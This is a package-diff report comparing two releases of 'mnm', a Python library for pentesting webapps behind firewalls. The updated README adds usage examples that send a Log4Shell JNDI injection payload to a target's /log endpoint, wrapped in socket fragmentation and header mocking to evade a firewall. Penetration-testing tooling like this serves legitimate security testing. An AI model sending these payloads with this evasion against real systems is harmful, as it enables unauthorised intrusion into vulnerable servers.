# Comparing `tmp/mnm-0.2.0.tar.gz` & `tmp/mnm-0.2.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "mnm-0.2.0.tar", last modified: Fri May  5 06:24:20 2023, max compression
+gzip compressed data, was "mnm-0.2.1.tar", last modified: Fri May  5 06:30:57 2023, max compression
```

## Comparing `mnm-0.2.0.tar` & `mnm-0.2.1.tar`

### file list

```diff
@@ -1,25 +1,25 @@
-drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:24:20.509023 mnm-0.2.0/
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1067 2023-05-01 04:28:16.000000 mnm-0.2.0/LICENSE
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      901 2023-05-05 06:24:20.499023 mnm-0.2.0/PKG-INFO
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      403 2023-05-01 12:59:53.000000 mnm-0.2.0/README.md
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      604 2023-05-05 06:20:10.000000 mnm-0.2.0/pyproject.toml
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)       38 2023-05-05 06:24:20.509023 mnm-0.2.0/setup.cfg
-drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:24:20.499023 mnm-0.2.0/src/
-drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:24:20.499023 mnm-0.2.0/src/mnm/
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      256 2023-05-05 05:43:08.000000 mnm-0.2.0/src/mnm/__init__.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      655 2023-05-05 05:37:33.000000 mnm-0.2.0/src/mnm/_internal_utils.py
-drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:24:20.499023 mnm-0.2.0/src/mnm/examples/
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      427 2023-05-05 06:14:01.000000 mnm-0.2.0/src/mnm/examples/mixed_options.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      382 2023-05-05 06:13:22.000000 mnm-0.2.0/src/mnm/examples/mixed_simple.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      445 2023-05-05 06:17:27.000000 mnm-0.2.0/src/mnm/examples/with_pattern.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      723 2023-05-05 06:16:06.000000 mnm-0.2.0/src/mnm/global_functions.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1795 2023-05-05 06:16:10.000000 mnm-0.2.0/src/mnm/header_mocking.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      638 2023-05-05 06:16:15.000000 mnm-0.2.0/src/mnm/mixed.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     2074 2023-05-05 06:16:19.000000 mnm-0.2.0/src/mnm/socket_fragmentation.py
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      353 2023-05-05 06:16:22.000000 mnm-0.2.0/src/mnm/wrapper.py
-drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:24:20.499023 mnm-0.2.0/src/mnm.egg-info/
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      901 2023-05-05 06:24:20.000000 mnm-0.2.0/src/mnm.egg-info/PKG-INFO
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      455 2023-05-05 06:24:20.000000 mnm-0.2.0/src/mnm.egg-info/SOURCES.txt
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)        1 2023-05-05 06:24:20.000000 mnm-0.2.0/src/mnm.egg-info/dependency_links.txt
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)       17 2023-05-05 06:24:20.000000 mnm-0.2.0/src/mnm.egg-info/requires.txt
--rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)        4 2023-05-05 06:24:20.000000 mnm-0.2.0/src/mnm.egg-info/top_level.txt
+drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:30:57.049017 mnm-0.2.1/
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1067 2023-05-01 04:28:16.000000 mnm-0.2.1/LICENSE
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1328 2023-05-05 06:30:57.049017 mnm-0.2.1/PKG-INFO
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      830 2023-05-05 06:29:37.000000 mnm-0.2.1/README.md
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      604 2023-05-05 06:30:13.000000 mnm-0.2.1/pyproject.toml
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)       38 2023-05-05 06:30:57.049017 mnm-0.2.1/setup.cfg
+drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:30:57.039017 mnm-0.2.1/src/
+drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:30:57.049017 mnm-0.2.1/src/mnm/
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      256 2023-05-05 05:43:08.000000 mnm-0.2.1/src/mnm/__init__.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      655 2023-05-05 05:37:33.000000 mnm-0.2.1/src/mnm/_internal_utils.py
+drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:30:57.049017 mnm-0.2.1/src/mnm/examples/
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      427 2023-05-05 06:14:01.000000 mnm-0.2.1/src/mnm/examples/mixed_options.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      382 2023-05-05 06:13:22.000000 mnm-0.2.1/src/mnm/examples/mixed_simple.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      445 2023-05-05 06:17:27.000000 mnm-0.2.1/src/mnm/examples/with_pattern.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      723 2023-05-05 06:16:06.000000 mnm-0.2.1/src/mnm/global_functions.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1795 2023-05-05 06:16:10.000000 mnm-0.2.1/src/mnm/header_mocking.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      638 2023-05-05 06:16:15.000000 mnm-0.2.1/src/mnm/mixed.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     2074 2023-05-05 06:16:19.000000 mnm-0.2.1/src/mnm/socket_fragmentation.py
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      353 2023-05-05 06:16:22.000000 mnm-0.2.1/src/mnm/wrapper.py
+drwxr-xr-x   0 ohk990102  (1000) ohk990102  (1000)        0 2023-05-05 06:30:57.049017 mnm-0.2.1/src/mnm.egg-info/
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)     1328 2023-05-05 06:30:57.000000 mnm-0.2.1/src/mnm.egg-info/PKG-INFO
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)      455 2023-05-05 06:30:57.000000 mnm-0.2.1/src/mnm.egg-info/SOURCES.txt
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)        1 2023-05-05 06:30:57.000000 mnm-0.2.1/src/mnm.egg-info/dependency_links.txt
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)       17 2023-05-05 06:30:57.000000 mnm-0.2.1/src/mnm.egg-info/requires.txt
+-rw-r--r--   0 ohk990102  (1000) ohk990102  (1000)        4 2023-05-05 06:30:57.000000 mnm-0.2.1/src/mnm.egg-info/top_level.txt
```

### Comparing `mnm-0.2.0/LICENSE` & `mnm-0.2.1/LICENSE`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/PKG-INFO` & `mnm-0.2.1/PKG-INFO`

 * *Files 25% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mnm
-Version: 0.2.0
+Version: 0.2.1
 Summary: A simple python library for pentesting firewall protected webapp
 Author-email: ohk990102 <ohk990102@gmail.com>
 Project-URL: Homepage, https://github.com/ohk990102/mnm
 Project-URL: Bug Tracker, https://github.com/ohk990102/mnm/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: POSIX :: Linux
@@ -20,23 +20,35 @@
 ```bash
 pip install mnm
 ```
 
 ## Usage
 
 ```python
-import mnm
-mnm.enable_socket_fragmentation()
-mnm.enable_header_mocking()
-
+from mnm import *
 import requests
-requests.get('http://example.com')
-
-mnm.disable_socket_fragmentation()
-mnm.disable_header_mocking()
 
-requests.get('http://example.com')
+@mixed(SocketFragmentation(slice=5), HeaderMocking())
+def mixed_options(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+@mixed()
+def mixed_simple(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+def with_pattern(ip):
+    with SocketFragmentation(slice=5), HeaderMocking():
+        r = requests.get(f'http://{ip}/log', data={
+            "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+        })
+        print(r.text)
 ```
 
 ## License
 
 MIT License
```

### Comparing `mnm-0.2.0/pyproject.toml` & `mnm-0.2.1/pyproject.toml`

 * *Files 19% similar despite different names*

```diff
@@ -1,14 +1,14 @@
 [build-system]
 requires = ["setuptools>=61.0"]
 build-backend = "setuptools.build_meta"
 
 [project]
 name = "mnm"
-version = "0.2.0"
+version = "0.2.1"
 authors = [
   { name="ohk990102", email="ohk990102@gmail.com" },
 ]
 description = "A simple python library for pentesting firewall protected webapp"
 readme = "README.md"
 classifiers = [
   "Programming Language :: Python :: 3",
```

### Comparing `mnm-0.2.0/src/mnm/_internal_utils.py` & `mnm-0.2.1/src/mnm/_internal_utils.py`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/src/mnm/global_functions.py` & `mnm-0.2.1/src/mnm/global_functions.py`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/src/mnm/header_mocking.py` & `mnm-0.2.1/src/mnm/header_mocking.py`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/src/mnm/mixed.py` & `mnm-0.2.1/src/mnm/mixed.py`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/src/mnm/socket_fragmentation.py` & `mnm-0.2.1/src/mnm/socket_fragmentation.py`

 * *Files identical despite different names*

### Comparing `mnm-0.2.0/src/mnm.egg-info/PKG-INFO` & `mnm-0.2.1/src/mnm.egg-info/PKG-INFO`

 * *Files 25% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mnm
-Version: 0.2.0
+Version: 0.2.1
 Summary: A simple python library for pentesting firewall protected webapp
 Author-email: ohk990102 <ohk990102@gmail.com>
 Project-URL: Homepage, https://github.com/ohk990102/mnm
 Project-URL: Bug Tracker, https://github.com/ohk990102/mnm/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: POSIX :: Linux
@@ -20,23 +20,35 @@
 ```bash
 pip install mnm
 ```
 
 ## Usage
 
 ```python
-import mnm
-mnm.enable_socket_fragmentation()
-mnm.enable_header_mocking()
-
+from mnm import *
 import requests
-requests.get('http://example.com')
-
-mnm.disable_socket_fragmentation()
-mnm.disable_header_mocking()
 
-requests.get('http://example.com')
+@mixed(SocketFragmentation(slice=5), HeaderMocking())
+def mixed_options(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+@mixed()
+def mixed_simple(ip):
+    r = requests.get(f'http://{ip}/log', data={
+        "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+    })
+    print(r.text)
+
+def with_pattern(ip):
+    with SocketFragmentation(slice=5), HeaderMocking():
+        r = requests.get(f'http://{ip}/log', data={
+            "log": "${jndi:ldap://localhost:1389/Basic/BinaryInj#z}"
+        })
+        print(r.text)
 ```
 
 ## License
 
 MIT License
```

